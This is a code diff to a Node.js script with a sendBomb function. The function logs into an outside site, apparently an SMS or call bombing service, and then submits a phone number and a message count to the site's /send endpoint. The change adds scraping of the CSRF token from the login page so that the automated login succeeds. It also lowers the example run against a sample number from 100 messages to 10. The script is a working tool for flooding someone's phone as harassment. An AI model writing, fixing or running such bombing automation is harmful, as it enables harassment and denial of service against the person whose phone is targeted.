@@ -12,10 +12,16 @@ const client = wrapper(axios.create({ jar }));
 
 async function sendBomb(phone, amount) {
   try {
-    // Login
+    // Get login page to extract CSRF token
+    const loginPage = await client.get('https://pikachutools.my.id/user/login');
+    const $ = cheerio.load(loginPage.data);
+    const token = $('input[name="_token"]').val();
+
+    // Login with CSRF token
     const loginRes = await client.post('https://pikachutools.my.id/user/login', {
       email,
-      password
+      password,
+      _token: token
     }, {
       headers: {
         'Content-Type': 'application/json'
@@ -24,7 +30,7 @@ async function sendBomb(phone, amount) {
 
     console.log("✅ Login Success");
 
-    // Submit bombing form
+    // Send bomb
     const res = await client.post('https://pikachutools.my.id/send', {
       nomor: phone,
       jumlah: amount
@@ -37,9 +43,9 @@ async function sendBomb(phone, amount) {
     }
 
   } catch (err) {
-    console.error("❌ Error:", err.message);
+    console.error("❌ Error:", err.response?.data || err.message);
   }
 }
 
-// Example run:
-sendBomb("01712345678", 100);
+// Example run
+sendBomb("01712345678", 10);
